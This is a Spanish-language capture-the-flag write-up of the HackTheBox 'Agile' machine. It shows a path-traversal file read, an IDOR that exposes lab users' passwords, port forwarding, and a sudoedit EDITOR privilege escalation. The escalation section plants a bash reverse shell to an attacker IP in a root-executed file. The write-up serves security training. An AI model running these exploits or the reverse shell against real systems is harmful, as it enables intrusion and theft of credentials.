---
layout: post
title: HackTheBox Agile - LFI, IDOR y sudoedit
author: c4rta
date: 2023-07-25
##categories: [Maquinas, HackTheBox]
tags: [HTB, LFI, IDOR]
---

Tenemos un sitio web que sirve como vaul de contraseñas donde descubriremos que es vulnerable a LFI a la hora de exportar las contraseñas, ese mismo LFI lo aprovecharemos para filtrar un archivo de la aplicacion mediante un error de incluir una ruta que no existe, despues mediante IDOR vamos a poder ver las credenciales del usuario corum, despues haremos port forwarding para traernos un puerto y descubriremos el mismo sitio web donde obtendremos las credenciales de edwards, y para la escalada nos aprovecharemos de una vulnerabilidad de sudoedit mediante la variable de entorno EDITOR
{:.lead}

## Enumeracion

Iniciamos con un escaneo de nmap con:

```bash
nmap -sS -n -Pn -T4 --open -p- 10.10.11.203
```

- sS: haga un TCP SYN Scan el cual hace que el destino responda con un RST si el puerto esta cerrado, o con un SYN/ACK si esta abierto, y ademas para que vaya mas rapido

- n: para que no haga resolucion DNS y tarde menos el escaneo

- Pn: para evitar el descubrimiento de hosts

- open: para que solo muestre los puertos abiertos

- -p-: para que escanee todo el rango de puertos

Y nos reporto dos puertos abiertos 22(SSH) y 80(HTTP)

```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Ahora escanearemos para obtener mas informacion sobre la version y el servicio que estan corriendo bajo ese puerto:

```bash
nmap -sCV -p22,80 10.10.11.203 
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)
|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Obtenemos que estamos contra un Ubuntu, el servidor web que usa en nginx y el http-title nos dice que nos esta redireccionado a un dominio: ```http-title: Did not follow redirect to http://superpass.htb```, asi que lo agregamos el etc/hosts

### Investigando el sitio web

El sitio web parace ser un administrador de contraseñas con el nombre ```SuperPassword```, si le damos en el apartado de login nos mandara a un panel de inicio de sesion y registro

![](/assets/img/agile/1.png)

Si intentamos evadir el login con SQLi no va por ahi, asi que simplemente nos registraremos, vemos como nos muestra un vaul de contraseñas donde podemos agregarlas y exportarlas

![](/assets/img/agile/3.png)

Si le damos en exportar veremos que nos descarga un archivo .csv

## Local File Inclusion (LFI)

Si interceptamos la peticion cuando le damos en exportar archivo podemos ver que en el parametro ```download``` se esta incluyendo el archivo csv

![](/assets/img/agile/4.png)

Por la menera en la que lo esta haciendo podriamos pensar en un LFI, asi que probaremos

Si lo hacemos directamente indicandole el archivo de esta manera no vamos a poder

```bash
GET /download?fn=/etc/passwd HTTP/1.1
```

Nos dira que el archivo o directorio no se existe:

```html
<p class="errormsg">FileNotFoundError: [Errno 2] No such file or directory: &#39;/tmp/etc/passwd&#39;</p>
```

Asi que usaremos directory path traversal de esta forma:

```bash
GET /download?fn=../../../../etc/passwd HTTP/1.1
```
Y ya nos muestra el contenido del archivo y tambien podemos ver que existe el usuario ```corum```, ```runner``` y ```edwards```

![](/assets/img/agile/5.png)

Despues de probar algunas cosas me decidi volver a probar esto pero esta vez, ver mas a detalle los errores:

```bash
GET /download?fn=/etc/passwd HTTP/1.1
```

Antes veiamos que si tratabamos de indicarle de esa forma el /etc/passwd nos daba un error, pues cuando ocasiona ese error tambien se filtran rutas de la aplicacion

![](/assets/img/agile/6.png)

Asi que me di cuenta que a indicarle una ruta que no existe nos filtra informacion de la aplicacion, como se ve en este otro caso que le indice esto:

```bash
GET /download?fn=../../nose HTTP/1.1
```

![](/assets/img/agile/7.png)

Despues de ver un rato, un archivo interesante es este ```/app/app/superpass/views/vault_views.py```

Vamos a mostrar su contenido de esta forma:

```bash
GET /download?fn=../../../app/app/superpass/views/vault_views.py 
```

```python
import flask
import subprocess
from flask_login import login_required, current_user
from superpass.infrastructure.view_modifiers import response
import superpass.services.password_service as password_service
from superpass.services.utility_service import get_random
from superpass.data.password import Password


blueprint = flask.Blueprint('vault', __name__, template_folder='templates')


@blueprint.route('/vault')
@response(template_file='vault/vault.html')
@login_required
def vault():
    passwords = password_service.get_passwords_for_user(current_user.id)
    print(f'{passwords=}')
    return {'passwords': passwords}


@blueprint.get('/vault/add_row')
@response(template_file='vault/partials/password_row_editable.html')
@login_required
def add_row():
    p = Password()
    p.password = get_random(20)
    return {"p": p}


@blueprint.get('/vault/edit_row/<id>')
@response(template_file='vault/partials/password_row_editable.html')
@login_required
def get_edit_row(id):
    password = password_service.get_password_by_id(id, current_user.id)

    return {"p": password}


@blueprint.get('/vault/row/<id>')
@response(template_file='vault/partials/password_row.html')
@login_required
def get_row(id):
    password = password_service.get_password_by_id(id, current_user.id)

    return {"p": password}


@blueprint.post('/vault/add_row')
@login_required
def add_row_post():
    r = flask.request
    site = r.form.get('url', '').strip()
    username = r.form.get('username', '').strip()
    password = r.form.get('password', '').strip()

    if not (site or username or password):
        return ''

    p = password_service.add_password(site, username, password, current_user.id)
    return flask.render_template('vault/partials/password_row.html', p=p)


@blueprint.post('/vault/update/<id>')
@response(template_file='vault/partials/password_row.html')
@login_required
def update(id):
    r = flask.request
    site = r.form.get('url', '').strip()
    username = r.form.get('username', '').strip()
    password = r.form.get('password', '').strip()

    if not (site or username or password):
        flask.abort(500)

    p = password_service.update_password(id, site, username, password, current_user.id)

    return {"p": p}


@blueprint.delete('/vault/delete/<id>')
@login_required
def delete(id):
    password_service.delete_password(id, current_user.id)
    return ''


@blueprint.get('/vault/export')
@login_required
def export():
    if current_user.has_passwords:        
        fn = password_service.generate_csv(current_user)
        return flask.redirect(f'/download?fn={fn}', 302)
    return "No passwords for user"
    

@blueprint.get('/download')
@login_required
def download():
    r = flask.request
    fn = r.args.get('fn')
    with open(f'/tmp/{fn}', 'rb') as f:
        data = f.read()
    resp = flask.make_response(data)
    resp.headers['Content-Disposition'] = 'attachment; filename=superpass_export.csv'
    resp.mimetype = 'text/csv'
    return resp
```

## IDOR

Basicamente IDOR es una vulnerabilidad en la cual el atacante puede acceder directamente a objetos (funciones, archivos, datos, etc) de acuerdo al input que haya ingresado. Vamos a analizar el codigo y te dire por que este sitio web es vulnerable

Observa que cuando se accede a la ruta ```/vault``` se manda a llamar a la funcion ```vault```

```python
@blueprint.route('/vault')
@response(template_file='vault/vault.html')
@login_required
def vault():
    passwords = password_service.get_passwords_for_user(current_user.id)
    print(f'{passwords=}')
    return {'passwords': passwords}
```

Esta funcion lo que hace es obtener las contraseñas de acuerdo al ID, se usa ```get_passwords_for_user``` para obtener las credenciales del usuario, y observa que recibe este parametro ```current_user.id```, lo que significa que obtiene el ID del usuario actual que esta autenticado, y despues esas contraseñas las manda a imprimir en el ```print```

La parte interesante esta en esta funcion:

```python
@blueprint.get('/vault/row/<id>')
@response(template_file='vault/partials/password_row.html')
@login_required
def get_row(id):
    password = password_service.get_password_by_id(id, current_user.id)

    return {"p": password}
```
Observa que ahora se le pasa esta ruta ```/vault/row/<id>``` la cual recibe un ID, y en caso de proporcionarle un ID y toda esa ruta sea correcta entonces se manda a llamar a ```get_row``` la cual recibe un ID, el cual es el que se le pasa por la URL y lo que estaria pasando en la funcion ```get_row``` es obtener la contraseña del usuario asociado a ese ID.

¿Entonces por que es vulnerable?, cuando ingresamos a la URL ```http://superpass.htb/vault/row/``` indicandole un ID valido al final, nos mostrara las credenciales de un usuario como se ve aca

![](/assets/img/agile/8.png)

Entonces lo que esta pasando es que podemos acceder directamente al objeto que tiene las contraseñas de acuerdo a nuestro input, el cual es el ID, y por eso es vulneable a IDOR, ahora, para saber cual ID es valido o no, puedes crear un diccionario de IDs y luego usar WFUZZ o gobuster para fuzzer por los ID, tambien puedes crearte un script de python que vaya probando los ID, o lo puedes hacer manual, simplemente en la URL le vas cambiando el ID y si cuela cuela, y bueno, te adelando que despues de fuzzear, encontre las credenciales de un usuario llamado corum con el ID 7

- usr: corum
- pass: 5db7caa1d13cc37c9fc2

Ingresamos por SSH y ya somos curum y tenemos la flag de user

![](/assets/img/agile/9.png)


## Corum a Edwards

Si ponemos el comando ```sudo -l``` para ver que podemos ejecutar como root, nos mostrara que no podemos ejecutar nada como root:

```bash
corum@agile:~$ sudo -l
[sudo] password for corum: 
Sorry, user corum may not run sudo on agile.
```

Si mostramos los puertos abiertos y conexiones establecidas con el comando ```netstat -a``` vamos a ver puertos interesantes
 
```bash
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN     
tcp        0      0 localhost:5555          0.0.0.0:*               LISTEN     
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN     
tcp        0      0 localhost:53409         0.0.0.0:*               LISTEN     
tcp        0      0 localhost:33060         0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN     
tcp        0      0 localhost:5000          0.0.0.0:*               LISTEN     
tcp        0      0 localhost:41829         0.0.0.0:*               LISTEN     
tcp        0      0 localhost:39900         localhost:53409         ESTABLISHED
tcp      150      0 localhost:46212         localhost:mysql         CLOSE_WAIT 
tcp      150      0 localhost:57136         localhost:mysql         CLOSE_WAIT 
tcp        0      0 localhost:48964         localhost:41829         ESTABLISHED
tcp        0      0 localhost:48972         localhost:41829         ESTABLISHED
tcp        0      0 localhost:53409         localhost:39900         ESTABLISHED
```
El puerto 5555, 5000 y 41829, asi que podriamos hacer por forwarding para traernos uno de esos puertos, pero antes de eso decidi mostrar el ```/etc/hosts``` para ver si hay algo mas, y vamos a poder ver cosas: 

```bash
corum@agile:~$ cat /etc/hosts
127.0.0.1 localhost superpass.htb test.superpass.htb
127.0.1.1 agile
```
Tenemos el dominio ```superpass.htb``` y el subdominio ```test.superpass.htb```, sabiendo eso ya podemos hacer port forwarding del puerto 5555

```bash
ssh -L 8080:127.0.0.1:5555 corum@superpass.htb
```

Despues en mi archivo /etc/hosts agrege los dominio que descubrimos, de esta forma

```bash
127.0.0.1  superpass.htb test.superpass.htb
```

Al entrar el sitio web nos podemos dar cuenta que es lo mismo que el anterior sitio web

![](/assets/img/agile/10.png)

Aqui simplemente fue por intuicion, si es el mismo sitio web, entonces puedo probar el mismo IDOR para ver si hay credenciales de otro usuario, y en efecto, ahora en el ID 1 encontre las credenciales de ```edwards```: ```http://test.superpass.htb:8080/vault/row/1```

- usr: edwards
- pass: d07867c6267dcb5df0af

## Escalada

Si usamos ```sudo -l``` veremos que podemos ejecutar como ```dev_admin``` el comando ```sudoedit``` sobre dos archivos

```bash
edwards@agile:~$ sudo -l
[sudo] password for edwards: 
Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

Al buscar en google una posible via de escalacion con sudoedit, encontre esto: 

- [https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudoedit-privilege-escalation/](https://exploit-notes.hdks.org/exploitlinux/privilege-escalation/sudo/sudoedit-privilege-escalation/)

- [https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf](https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf)

Vemos que nos permite convertirnos en root mediante la variable de entorno ```EDITOR```

Primero exportamos la variable de entorno EDITOR con este valor:

```bash
export EDITOR='vim -- /app/venv/bin/activate'
```

Y es con ese valor por que al mostrar los archivos que pertenecen el grupo dev_admin, tenemos el ```activate```:

```bash
edwards@agile:~$ find / -group dev_admin 2>/dev/null
/home/dev_admin
/app/venv
/app/venv/bin
/app/venv/bin/activate
/app/venv/bin/Activate.ps1
/app/venv/bin/activate.fish
/app/venv/bin/activate.csh
```

Despues editamos el archivo ```config_test.json``` 

```bash
sudo -u dev_admin sudoedit /app/config_test.json
```

Y al principio agregamos una reverse shell:

```bash
bash -i >& /dev/tcp/<tu_IP>/443 0>&1
```

De esta manera

![](/assets/img/agile/12.png)

Despues guardamos y salimos y unos segundos despues nos llegara una conexion como root

![](/assets/img/agile/11.png)


Eso ha sido todo, gracias por leer ❤

![](/assets/img/agile/waifu.gif)


